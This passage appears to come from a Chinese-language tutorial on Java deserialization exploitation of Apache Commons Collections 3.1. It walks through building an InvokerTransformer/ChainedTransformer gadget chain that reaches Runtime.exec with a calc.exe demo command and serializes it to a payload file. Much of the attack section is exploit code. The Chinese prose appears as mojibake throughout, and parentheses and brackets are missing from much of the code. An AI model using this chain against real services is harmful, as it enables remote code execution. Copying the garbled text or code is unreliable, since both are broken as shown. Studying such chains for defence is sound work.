a_in = (InvokerTransformer) fin.readObject;a_in.transform(input);}</p><p>æˆ‘å€‘æœƒç™¼ç¾å¦‚æœæˆ‘å€‘è¦ç›´æ¥åˆ©ç”¨é€™å€‹åå°„æ©Ÿåˆ¶ä½œç‚ºæ¼æ´çš„è©±ï¼Œéœ€è¦æœå‹™ç«¯çš„é–‹ç™¼äººå“¡ï¼š</p><ol start=1><li>å¹«æˆ‘å€‘å¯«ä¸€å€‹payloadä½œç‚ºinputï¼›</li><li>æ¥å—å®¢æˆ¶ç«¯è¼¸å…¥åƒæ•¸ï¼Œååºåˆ—åŒ–æˆInvokerTransformeré¡</li><li>å†åˆ»æ„èª¿ç”¨InvokerTransformeré¡çš„transformå‡½æ•¸</li></ol><p>å¯¦éš›ä¸Šâ€¦..åªæœ‰é–‹ç™¼äººå“¡æ˜¯è‡ªå·±äººçš„æƒ…æ³ä¸‹æ‰æ»¿è¶³æ¢ä»¶å§â€¦â€¦æ‰€ä»¥æˆ‘å€‘é¢è‡¨ä¸€äº›å•é¡Œï¼š</p><ol start=1><li>payloadè‚¯å®šéœ€è¦åœ¨å®¢æˆ¶ç«¯å¯ä»¥è‡ªå®šç¾©æ§‹é€ ï¼Œå†å‚³è¼¸é€²å…¥æœå‹™ç«¯</li><li>æœå‹™ç«¯éœ€è¦æŠŠæˆ‘å€‘çš„è¼¸å…¥expååºåˆ—åŒ–æˆä¸€å€‹åœ¨ä»£ç¢¼ä¸­å¯èƒ½ä½¿ç”¨åˆ°çš„é¡</li><li>ä¸¦ä¸”åœ¨ä»£ç¢¼æ­£å¸¸æ“ä½œä¸­æœƒèª¿ç”¨é€™å€‹é¡ä¸­çš„ä¸€å€‹å¯è§¸ç™¼æ¼æ´åœ°å‡½æ•¸ï¼ˆç•¶ç„¶é€™å€‹å‡½æ•¸æœ€å¾Œæœƒé€²å…¥æˆ‘å€‘InvokerTransformeré¡çš„transformå‡½æ•¸ï¼Œå¾è€Œå½¢æˆå‘½ä»¤åŸ·è¡Œï¼‰</li><li>å¦‚æœé€™å€‹ååºåˆ—åŒ–çš„é¡å’Œé€™å€‹é¡è§¸ç™¼å‘½ä»¤åŸ·è¡Œçš„æ–¹æ³•å¯ä»¥åœ¨ä¸€å€‹readObjectè¤‡å¯«å‡½æ•¸ä¸­æ°å¥½è§¸ç™¼ï¼Œå°±å°æ–¼æœå‹™ç«¯ä¸Šä¸‹æ–‡èªå¥æ²’æœ‰è¦æ±‚äº†ï¼</li></ol><p>é€™é‚Šå‡å¦‚åƒé æœŸé€™æ¨£ï¼Œæ˜¯å°æœå‹™ç«¯ä¸Šä¸‹æ–‡æ²’æœ‰è¦æ±‚ï¼Œå› ç‚ºåªè¦åŸ·è¡ŒreadObjectå°±è‚¯å®šæœƒå‘½ä»¤åŸ·è¡Œï¼Œä¸éœ€è¦å…¶ä»–ä¸Šä¸‹æ–‡æ¢ä»¶ã€‚</p><p>ä½†æ˜¯å°æ–¼æœå‹™ç«¯ç‰ˆæœ¬ç’°å¢ƒæ˜¯æœ‰è¦æ±‚çš„ï¼Œä¹‹å¾Œæœƒèªªåˆ°</p><p>é‚£éº¼æˆ‘å€‘ä¸€å€‹å€‹ä¾†è§£æ±ºå•é¡Œï¼šé¦–å…ˆä½¿å®¢æˆ¶ç«¯è‡ªå®šç¾©paylaodï¼</p><p><strong>ç¬¬äºŒæ­¥ ChainedTransformer</strong></p><p>ä¸‹é¢æˆ‘å€‘éœ€è¦é—œæ³¨ChainedTransformeré€™å€‹é¡,é¦–å…ˆçœ‹ä¸€ä¸‹é€™å€‹é¡çš„æè¿°ï¼š</p><p>/*** Transformer implementation that chains the specified transformers together.* &lt;p>* The input object is passed to the first transformer. The transformed result* is passed to the second transformer and so on.*å°‡æŒ‡å®šçš„è½‰æ›å™¨é€£æ¥åœ¨ä¸€èµ·çš„è½‰åŒ–å™¨å¯¦ç¾ã€‚è¼¸å…¥çš„å°è±¡å°‡è¢«å‚³éåˆ°ç¬¬ä¸€å€‹è½‰åŒ–å™¨ï¼Œè½‰æ›çµæœå°‡æœƒè¼¸å…¥åˆ°ç¬¬äºŒå€‹è½‰åŒ–å™¨ï¼Œä¸¦ä»¥æ­¤é¡æ¨</p><p>å¯ä»¥çŸ¥é“ä»–æœƒæŠŠæˆ‘å€‘çš„Transformerè®Šæˆä¸€å€‹ä¸²ï¼Œå†é€ä¸€åŸ·è¡Œï¼Œå…¶ä¸­é€™å€‹æ“ä½œå°æ‡‰çš„å°±æ˜¯ChainedTransformeré¡çš„transformå‡½æ•¸</p><p>/*** Transforms the input to result via each decorated transformer** @param object the input object passed to the first transformer* @return the transformed result*/public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) {object = iTransformers[i].transform(object);} return object;}</p><p>é€™è£¡æœƒéæ­·iTransformersæ•¸çµ„ï¼Œä¾æ¬¡èª¿ç”¨é€™å€‹æ•¸çµ„ä¸­æ¯ä¸€å€‹Transformerçš„transformï¼Œä¸¦ä¸²è¡Œå‚³éåŸ·è¡Œçµæœã€‚</p><p>é¦–å…ˆç¢ºå®šiTransformerså¯æ§ï¼ŒiTransformersæ•¸çµ„æ˜¯é€šéChainedTransformeré¡çš„æ§‹é€ å‡½æ•¸è³¦å€¼çš„ï¼š</p><p>/*** Constructor that performs no validation.* Use &lt;code>getInstance&lt;/code> if you want that.** @param transformers the transformers to chain, not copied, no nulls*/public ChainedTransformer(Transformer transformers) { super;//é€™å€‹superä¸æ¸…æ¥šåšäº†å•¥ï¼ŒiTransformers = transformers;}</p><p>é‚£éº¼æˆ‘å€‘çŸ¥é“å¯ä»¥è‡ªå®šç¾©iTransformersçš„å…§å®¹ï¼Œæˆ‘å€‘å·²æœ‰æ¢ä»¶å¦‚ä¸‹ï¼š</p><p>//æœ€çµ‚åŸ·è¡Œç›®æ¨™Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//æ­¤è™•åœ¨ç²å–å¯¦ä¾‹, "calc.exe") //InvokeTransformeré—œéµèªå¥ï¼špublic Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>å†çœ‹åˆ°InvokeTransformerä»£ç¢¼æˆ‘å€‘éœ€è¦å¼•å‡ºä¸€å€‹æ³¨æ„é»ï¼š</p><p>é€™è£¡æˆ‘å€‘éœ€è¦æ³¨æ„åˆ°input.getClassé€™å€‹æ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›å€åˆ¥ï¼š</p><ul><li>ç•¶inputæ˜¯ä¸€å€‹é¡çš„å¯¦ä¾‹å°è±¡æ™‚ï¼Œç²å–åˆ°çš„æ˜¯é€™å€‹é¡</li><li>ç•¶inputæ˜¯ä¸€å€‹é¡æ™‚ï¼Œç²å–åˆ°çš„æ˜¯java.lang.Class</li></ul><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç¢¼é©—è­‰ï¼Œé€™è£¡ä¸å†è´…è¿°</p><p>Object a = Runtime.getRuntime;Class b = Runtime.class;System.out.println(a.getClass);System.out.println(b.getClass); //çµæœ//class java.lang.Runtime//class java.lang.Class</p><p>åŸºæ–¼ä¹‹å‰å¯«çš„ä»£ç¢¼ï¼š</p><p>//åªèª¿ç”¨InvokeTransformerçš„æƒ…æ³å¦‚ä¸‹ï¼šInvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));</p><p>æˆ‘å€‘ä¹Ÿå¯ä»¥çŸ¥é“inputçš„ç‚ºRuntimeé¡çš„å°è±¡ï¼Œæ‰€ä»¥clså°±æ˜¯Runtimeé¡ï¼Œæ‰€ä»¥cls.getMethodå¯ä»¥æ‰¾åˆ°execæ–¹æ³•ï¼Œç›´æ¥é€²è¡Œèª¿ç”¨ã€‚</p><p>å…ˆæŠŠaå°è£æˆChainedTransformeræ ¼å¼ï¼Œä½†æ˜¯payloadé‚„æ˜¯åœ¨å¤–é¢</p><p>//å®¢æˆ¶ç«¯æ§‹é€ payloadTransformer transformers = new Transformer { new InvokerTransformer("exec",new Class{String.class},new String{"calc.exe"});}Transformer transformerChain = new ChainedTransformer(transformers); //æœå‹™ç«¯è§¸ç™¼æ‰€éœ€å…§å®¹Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));transformerChain.transform(input);//æ­¤è™•å¿…é ˆç‚ºinputï¼Œä½œç‚ºç¬¬ä¸€å€‹è¼¸å…¥</p><p>æŠŠpayloadæ”¾å…¥Transformeræ•¸çµ„ä¸­ï¼Œéœ€è¦è½‰åŒ–æˆç‰¹å®šçš„Transformeræ ¼å¼æ‰è¡Œã€‚</p><p><strong>ç¬¬äºŒé»äº”æ­¥ ConstantTransformer -> Runtimeå¯¦ä¾‹åºåˆ—åŒ–</strong></p><p>æˆ‘å€‘æ‰¾åˆ°ConstantTransformeré¡è·ŸInvokkerTransformerä¸€æ¨£ç¹¼æ‰¿Transformeçˆ¶é¡ï¼Œå¯ä»¥é€²å…¥æ•¸çµ„é¡§åæ€ç¾©ConstantTransformeré¡å…¶å¯¦å°±åªæœƒå­˜æ”¾ä¸€å€‹å¸¸é‡ï¼›å®ƒçš„æ§‹é€ å‡½æ•¸æœƒå¯«å…¥é€™å€‹è®Šé‡ï¼Œä»–çš„transformå‡½æ•¸æœƒè¿”å›é€™å€‹è®Šé‡ã€‚æŠŠRuntimeå¯¦ä¾‹å¯«å…¥é€™å€‹è®Šé‡ï¼š</p><p>Transformer transformers = new Transformer { //ä»¥ä¸‹å…©å€‹èªå¥ç­‰åŒ,ä¸€å€‹æ˜¯é€šéåå°„æ©Ÿåˆ¶å¾—åˆ°ï¼Œä¸€å€‹æ˜¯ç›´æ¥èª¿ç”¨å¾—åˆ°Runtimeå¯¦ä¾‹// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),new ConstantTransformer(Runtime.getRuntime), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);//æ­¤è™•è¼¸å…¥å¯ä»¥ç‚ºä»»æ„å€¼ï¼Œå› ç‚ºä¸æœƒè¢«ä½¿ç”¨åˆ°ï¼Œç›¸ç•¶æ–¼åˆå§‹ç¬¬ä¸€å€‹è¼¸å…¥ç‚ºæˆ‘å€‘è¨­ç½®çš„å¸¸é‡</p><p>ä»¥ä¸Šä»£ç¢¼å¯ä»¥æˆåŠŸå½ˆæ¡†åŸ·è¡Œï¼é‚£éº¼æˆ‘å€‘æ¨¡æ“¬ä¸€ä¸‹åºåˆ—åŒ–èˆ‡ååºåˆ—åŒ–éç¨‹ï¼</p><p>//å®¢æˆ¶ç«¯æ§‹é€ payloadTransformer transformers = new Transformer { new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers); //payloadåºåˆ—åŒ–å¯«å…¥æ–‡ä»¶ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //æœå‹™ç«¯ååºåˆ—åŒ–payloadè®€å–FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœå‹™ç«¯ååºåˆ—åŒ–æˆChainedTransformeræ ¼å¼ï¼Œä¸¦åœ¨æœå‹™ç«¯è‡ªä¸»å‚³å…¥æƒ¡æ„åƒæ•¸inputTransformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);</p><p>ä½†æ˜¯å¾ˆéºæ†¾çš„å‘Šè¨´ä»¥ç‚ºå¿«è¦æˆåŠŸçš„ä½ ï¼ŒæˆåŠŸçš„æœ¬åœ°æ¸¬è©¦åŠ ä¸Šåºåˆ—åŒ–ã€ååºåˆ—åŒ–éç¨‹ä¹‹å¾Œå°±æœƒå¤±æ•—ã€‚å› ç‚ºRuntimeé¡çš„å®šç¾©æ²’æœ‰ç¹¼æ‰¿Serializableé¡ï¼Œæ‰€ä»¥æ˜¯ä¸æ”¯æŒååºåˆ—åŒ–çš„ã€‚</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a692eb7772c1477f83a9626dd41407bf><p class=pgc-img-caption></p></div><p>é‚£éº¼æˆ‘å€‘åœ¨payloadå¯«å…¥Runtimeå¯¦ä¾‹çš„è¨ˆåŠƒå°±æ³¡æ¹¯äº†ã€‚</p><p><strong>ç¬¬äºŒé»å…«æ­¥ åœ¨æœå‹™ç«¯ç”ŸæˆRuntimeå¯¦ä¾‹</strong></p><p>æ—¢ç„¶æˆ‘å€‘æ²’æ³•åœ¨å®¢æˆ¶ç«¯åºåˆ—åŒ–å¯«å…¥Runtimeçš„å¯¦ä¾‹ï¼Œé‚£å°±è®“æœå‹™ç«¯åŸ·è¡Œæˆ‘å€‘çš„å‘½ä»¤ç”Ÿæˆä¸€å€‹Runtimeå¯¦ä¾‹å”„ï¼Ÿæˆ‘å€‘çŸ¥é“Runtimeçš„å¯¦ä¾‹æ˜¯é€šéRuntime.getRuntimeä¾†ç²å–çš„ï¼Œè€ŒInvokerTransformerè£¡é¢çš„åå°„æ©Ÿåˆ¶å¯ä»¥åŸ·è¡Œä»»æ„å‡½æ•¸ã€‚åŒæ™‚ï¼Œæˆ‘å€‘å·²ç¶“æˆåŠŸåŸ·è¡ŒéRuntimeé¡è£¡é¢çš„execå‡½æ•¸ã€‚è¬›é“ç†è‚¯å®šæ˜¯æ²’å•é¡Œçš„.</p><p>æˆ‘å€‘å…ˆçœ‹getRuntiimeæ–¹æ³•çš„åƒæ•¸</p><p>public static Runtime getRuntime { return currentRuntime;}</p><p>æ²’æœ‰åƒæ•¸ï¼Œé‚£å°±éå¸¸ç°¡å–®äº†</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class),//å¾—åˆ°Runtime class//ç”±æ–¼InvokerTransformerçš„æ§‹é€ å‡½æ•¸è¦æ±‚å‚³å…¥Classé¡å‹çš„åƒæ•¸é¡å‹ï¼Œå’ŒObjecté¡å‹çš„åƒæ•¸æ•¸å€¼ï¼Œæ‰€ä»¥å°è£ä¸€ä¸‹ï¼Œä¸‹é¢ä¹Ÿä¸€æ¨£//ä¸Šé¢å‚³å…¥Runtime.classï¼Œèª¿ç”¨Runtime classçš„getRuntimeæ–¹æ³•ï¼ˆç”±æ–¼æ˜¯ä¸€å€‹éœæ…‹æ–¹æ³•ï¼Œinvokeèª¿ç”¨éœæ…‹æ–¹æ³•ï¼Œå‚³å…¥é¡å³å¯ï¼‰new InvokerTransformer("getRuntime",new Class{},new Object{}), //ä¸Šé¢Runtime.getRuntimeå¾—åˆ°äº†å¯¦ä¾‹ï¼Œä½œç‚ºé€™é‚Šçš„è¼¸å…¥(invokeèª¿ç”¨æ™®é€šæ–¹æ³•ï¼Œéœ€è¦å‚³å…¥é¡çš„å¯¦ä¾‹)new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);</p><p>åœ¨é€™è£¡ï¼Œä¹‹å‰è‡ªå·±é™·å…¥äº†ä¸€å€‹å¾ˆå‚»é€¼çš„å•é¡Œï¼Œå³ï¼šInvokerTransformeré¡transformæ–¹æ³•ä¸­return method.invokeé€™å€‹èªå¥invokeèª¿ç”¨åˆ°åº•returnäº†å•¥?å› ç‚ºåœ¨é€™è£¡å½¢æˆäº†ä¸€å€‹èª¿ç”¨returnçš„çµæœï¼Œå†èª¿ç”¨çš„éˆã€‚ç‚ºä»€éº¼å°±å¯ä»¥ä¸Šä¸€å€‹è¼¸å‡ºä½œç‚ºä¸‹ä¸€å€‹è¼¸å…¥æ™‚ï¼Œå¯ä»¥æˆåŠŸèª¿ç”¨äº†å‘¢ï¼Ÿä¸€é–‹å§‹ä»¥ç‚ºinvokeæœƒçµ±ä¸€è¿”å›ä¸€å€‹å°è±¡ä½œç‚ºä¸‹ä¸€å€‹è¼¸å…¥ä»€éº¼çš„ï¼Œä¸¦ä¸”åœ¨èª¿è©¦çš„æ™‚å€™æ¯æ¬¡invokeçš„çµæœéƒ½ä¸ä¸€æ¨£ï¼Œæºç¢¼çœ‹çš„é ­æšˆã€‚å¯¦éš›ä¸Šæ˜¯é‘½äº†æ­»è¡šè¡•ï¼šinvokeçš„returnæ˜¯æ ¹æ“šè¢«èª¿ç”¨çš„å‡½æ•¸returnå•¥ï¼Œinvokeå°±returnå•¥ã€‚å°±å¥½æ¯”æˆ‘invokeä¸€å€‹æˆ‘è‡ªå®šç¾©çš„æ–¹æ³•aï¼Œåœ¨aä¸­ï¼Œæˆ‘returnäº†å­—ç¬¦ä¸²"1"ã€‚é‚£éº¼å°±æ˜¯invokeçš„çµæœå°±æ˜¯å­—ç¬¦ä¸²"1"ã€‚çœ‹ä»¥ä¸Šçš„éç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡Runtime.getRuntimeçš„çµæœè¼¸å…¥äº†ä¸‹ä¸€å€‹InvokerTransformer</p><p>ä»¥ä¸Šæ„Ÿè¦ºæ˜¯è¬äº‹å¤§å‰äº†ï¼ä½†æ˜¯å¯¦éš›ä¸Šä¸¦ä¸æ˜¯â€¦</p><p>å›æƒ³ä¹‹å‰å°æ–¼InvokerTransformerä¸­Class cls = input.getClass;çš„è§£é‡‹</p><ul><li>é€™è£¡æˆ‘å€‘éœ€è¦æ³¨æ„åˆ°input.getClassé€™å€‹æ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›å€åˆ¥ï¼š</li><li>ç•¶inputæ˜¯ä¸€å€‹é¡çš„å¯¦ä¾‹å°è±¡æ™‚ï¼Œç²å–åˆ°çš„æ˜¯é€™å€‹é¡</li></ul><p>ç•¶inputæ˜¯ä¸€å€‹é¡æ™‚ï¼Œç²å–åˆ°çš„æ˜¯java.lang.Class</p><p>æˆ‘å€‘ä¾†æ¨æ¼”ç¬¬ä¸€æ¬¡InvokerTransformerçš„åå°„èª¿ç”¨ï¼Œå³å¾—åˆ°Runtimeé¡å°è±¡çš„getRuntimeæ–¹æ³•èª¿ç”¨:</p><p>//InvokeTransformeré—œéµèªå¥ï¼špublic Object transform(Object input) {//inputç‚ºæˆ‘å€‘è¨­ç½®çš„å¸¸é‡Runtime.classClass cls = input.getClass;//ï¼ï¼ï¼é€™è£¡ç”±æ–¼inputæ˜¯ä¸€å€‹é¡ï¼Œæœƒå¾—åˆ°java.lang.Class//åœ¨java.lang.Classé¡ä¸­å»å°‹æ‰¾getRuntimeæ–¹æ³•ä¼åœ–å¾—åˆ°Runtimeé¡å°è±¡ï¼Œæ­¤è™•å ±éŒ¯ï¼ï¼Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>é‚£éº¼æˆ‘å€‘å¥½åƒé™·å…¥äº†ä¸€å€‹æ­»è¡šè¡•ï¼šå¾—åˆ°Runtimeé¡å¯¦ä¾‹æ‰èƒ½èª¿ç”¨execæ–¹æ³•ã€‚è€Œå¾—åˆ°Runtimeé¡å¯¦ä¾‹ä½œç‚ºinputï¼Œæ‰èƒ½å¾—åˆ°Runtime classï¼Œæ‰èƒ½æ‰¾åˆ°getRuntimeæ–¹æ³•ï¼Œå¾—åˆ°Runtimeé¡å¯¦ä¾‹â€¦â€¦â€¦</p><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦éå¸¸çš„å°·å°¬â€¦â€¦â€¦â€¦â€¦â€¦â€¦..</p><p><strong>ç¬¬äºŒé»ä¹æ­¥ é‚„æ˜¯åå°„æ©Ÿåˆ¶</strong></p><p>é‚£éº¼æˆ‘å€‘é€šéç›´æ¥èª¿ç”¨Runtime.getRuntimeæ–¹æ³•å¥½åƒæ˜¯è¡Œä¸é€šäº†,æœ‰æ²’æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Ÿ</p><p><strong>é‚„æ˜¯åå°„æ©Ÿåˆ¶</strong></p><p>å·²çŸ¥ï¼š</p><ol start=1><li>æˆ‘å€‘é–‹é ­ä¸èƒ½ç²å¾—Class.forName("java.lang.Runtime")ï¼Œåªèƒ½å¾—åˆ°Class.forName("java.lang.Class")</li><li>æˆ‘å€‘å¯ä»¥æœ‰ä»»æ„çš„åå°„æ©Ÿåˆ¶æ±‚ï¼š</li><li>æˆ‘å€‘è¦ç²å–åˆ°Runtime.getRunimeå‡½æ•¸ï¼Œä¸¦åŸ·è¡Œå®ƒã€‚è§£ï¼š</li><li>é€šéåå°„æ©Ÿåˆ¶ç²å–åå°„æ©Ÿåˆ¶ä¸­çš„getMethodé¡ï¼Œç”±æ–¼getMethodé¡æ˜¯å­˜åœ¨Classé¡ä¸­ï¼Œå°±ç¬¦åˆé–‹é ­Classé¡çš„é™åˆ¶</li><li>é€šégetMethodå‡½æ•¸ç²å–Runtimeé¡ä¸­çš„getRuntimeå‡½æ•¸</li><li>åœ¨å“ªå€‹é¡ä¸­èª¿ç”¨getMethodå»ç²å–æ–¹æ³•ï¼Œå¯¦éš›ä¸Šæ˜¯ç”±invokeå‡½æ•¸è£¡é¢çš„çš„ç¬¬ä¸€å€‹åƒæ•¸objæ±ºå®šçš„</li><li>å†é€šéåå°„æ©Ÿåˆ¶ç²å–åå°„æ©Ÿåˆ¶ä¸­çš„invokeé¡ï¼ŒåŸ·è¡Œä¸Šé¢ç²å–çš„getRuntimeå‡½æ•¸</li><li>invokeèª¿ç”¨getRuntimeå‡½æ•¸ï¼Œç²å–Runtimeé¡çš„å¯¦ä¾‹é€™è£¡åœ¨ä½¿ç”¨åå°„æ©Ÿåˆ¶èª¿ç”¨getRuntimeéœæ…‹é¡æ™‚ï¼Œinvokeè£¡é¢ç¬¬ä¸€å€‹åƒæ•¸objå…¶å¯¦å¯ä»¥ä»»æ„æ”¹ç‚ºnullï¼Œæˆ–è€…å…¶ä»–é¡ï¼Œè€Œä¸ä¸€å®šè¦æ˜¯Runtimeé¡</li></ol><p>å…·é«”è®ŠåŒ–ç´°ç¯€ï¼Œæˆ‘é¸æ“‡æŠŠå®ƒæ”¾åœ¨åå°„æ©Ÿåˆ¶ä¸€æ–‡ä¸­èªªæ˜ï¼Œé€™é‚Šçµ¦å‡ºçµæœã€‚</p><p>æˆ‘å€‘çš„æœ€çµ‚ç›®çš„æ˜¯åŸ·è¡ŒClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")</p><p>å…ˆä¾†ç²å–getRuntimeé¡</p><p>//ç›®æ¨™èªå¥Class.forName("java.lang.Runtime").getMethod("getRuntime")//ä½¿ç”¨java.lang.Classé–‹é ­Class.forName("java.lang.Class").getMethod("getMethod", new Class {String.class, Class.class }).invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]); //invokeå‡½æ•¸çš„ç¬¬ä¸€å€‹åƒæ•¸æ˜¯Runtimeé¡ï¼Œæˆ‘å€‘éœ€è¦åœ¨Runtimeé¡ä¸­å»åŸ·è¡ŒgetMethodï¼Œç²å–getRuntimeåƒæ•¸</p><p>å°ç…§è‘—InvokerTransformeré¡è½‰è®Šç‚ºtransformersæ ¼å¼</p><p>Class cls = input.getClass;//cls = java.lang.ClassMethod method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethodæ–¹æ³•return method.invoke(input, this.iArgs); //åœ¨Runtimeä¸­æ‰¾getRuntimeæ–¹æ³•ï¼Œä¸¦è¿”å›é€™å€‹æ–¹æ³•</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), //é‚„éœ€è¦å¡«å…… èª¿ç”¨getRuntimeå¾—åˆ°Runtimeå¯¦ä¾‹,new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>é‚„å·®åŸ·è¡Œç²å–åˆ°çš„getRuntimeï¼Œä¸‹ä¸€å€‹inputæ˜¯ä¸Šä¸€å€‹åŸ·è¡Œæ¥å£ï¼Œç¹¼çºŒå°ç…§</p><p>//input=getRuntimeé€™å€‹æ–¹æ³•Class cls = input.getClass;//cls = java.lang.Methodï¼ˆgetRuntimeæ–¹æ³•æ˜¯methodé¡ï¼‰Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //åœ¨methodé¡ä¸­æ‰¾åˆ°invokeæ–¹æ³•ï¼Œmethod=invokeæ–¹æ³•return method.invoke(input, this.iArgs); //èª¿ç”¨invokeæ–¹æ³•ï¼Œinput=getRuntimeé€™å€‹æ–¹æ³•ï¼Œå‚³å…¥è‡ªå®šç¾©çš„åƒæ•¸</p><p>ä»¥ä¸Šæœ€å¾Œä¸€æ­¥æœ‰é»è¤‡é›œï¼Œmethodå°±æ˜¯invokeæ–¹æ³•ï¼Œç›¸ç•¶æ–¼ä½¿ç”¨invokeèª¿ç”¨äº†invokeå‡½æ•¸ã€‚é¦–å…ˆthis.iMethodName, this.iParamTypesæ˜¯æ ¹æ“šinvokeæ¥å£è€Œå®šçš„ï¼š</p><p>public Object invoke(Object obj, Object... args)//this.iMethodName="invoke"//this.iParamTypes=new Class {Object.class, Object.class }//å¤–é¢classã€Objectå°è£æ˜¯InvokerTransformeré¡çš„æ§‹é€ å‡½æ•¸è¦æ±‚</p><p>æŒ‰ç…§invokeä¸­çš„inputæ‰æ˜¯å®ƒè¦èª¿ç”¨çš„ç’°å¢ƒçš„æº–å‰‡ã€‚invokeæ–¹æ³•.invoke(input, this.iArgs)å¯¦éš›ä¸Šç­‰æ–¼input.invoke(this.iArgs)ï¼Œè€Œinput=getRuntimeæ–¹æ³•ï¼Œé‚£éº¼åªè¦å¡«å…¥this.iArgså°±å¥½äº†</p><p>åˆç”±æ–¼getRuntimeæ˜¯å€‹éœæ…‹å‡½æ•¸ï¼Œä¸ç”¨å¤ªç³¾çµè¼¸å…¥objï¼Œå¯«ä½œnullã€‚getRuntimeæ–¹æ³•ä¸éœ€è¦åƒæ•¸ã€‚this.iArgs=null,new Object[0]</p><p>é‚£éº¼æ•´åˆå°±å¦‚ä¸‹ï¼š</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>ä»¥ä¸Šä»£ç¢¼å…¶å¯¦å°±æ˜¯ç­‰åŒæ–¼((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec("calc.exe");æˆ‘å€‘ç± çµ±çš„ä¾†ç†è§£ï¼Œå¯¦éš›å°±æ˜¯å¦‚ä¸‹ï¼ˆé€™è£¡å·ä¸€å¼µorlevençš„åœ–ï¼‰ï¼š</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/399744f6d7d94c5bb840de05422a8d70><p class=pgc-img-caption></p></div><p>ç¸½é«”ä¸Šä¾†èªªï¼šåˆ©ç”¨äº†åå°„æ©Ÿåˆ¶èª¿ç”¨åå°„æ©Ÿåˆ¶çš„å‡½æ•¸ï¼Œç¹éäº†é–‹é ­clsåªèƒ½ç‚ºjava.lang.Classçš„é™åˆ¶ï¼Œæ ¹æ“šå…·é«”ç’°å¢ƒinputç’°ç’°ç›¸æ‰£ï¼Œç‰¹éº¼ç«Ÿç„¶æ°å¥½å°±é€šäº†â€¦.éå¸¸çš„å¾®å¦™â€¦.</p><p><strong>ç¬¬ä¸‰æ­¥ TransformedMap</strong></p><p>é‚£éº¼æˆ‘å€‘åœ¨ç¬¬äºŒæ­¥é€šéConstantTransformerã€ChainedTransformerå°±å®Œæˆäº†payloadåœ¨å®¢æˆ¶ç«¯è‡ªå®šç¾©é€™ä¸€ç›®æ¨™ï¼Œæˆ‘å€‘çœ‹ä¸€ä¸‹ç›®å‰çš„æ”»æ“Šæµç¨‹</p><p>public class commons_collections_3_1 { public static void main(String args) throws Exception { //1.å®¢æˆ¶ç«¯æ§‹å»ºæ”»æ“Šä»£ç¢¼//æ­¤è™•æ§‹å»ºäº†ä¸€å€‹transformersçš„æ•¸çµ„ï¼Œåœ¨å…¶ä¸­æ§‹å»ºäº†ä»»æ„å‡½æ•¸åŸ·è¡Œçš„æ ¸å¿ƒä»£ç¢¼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°‡transformersæ•¸çµ„å­˜å…¥ChaniedTransformeré€™å€‹ç¹¼æ‰¿é¡Transformer transformerChain = new ChainedTransformer(transformers); //payloadåºåˆ—åŒ–å¯«å…¥æ–‡ä»¶ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); 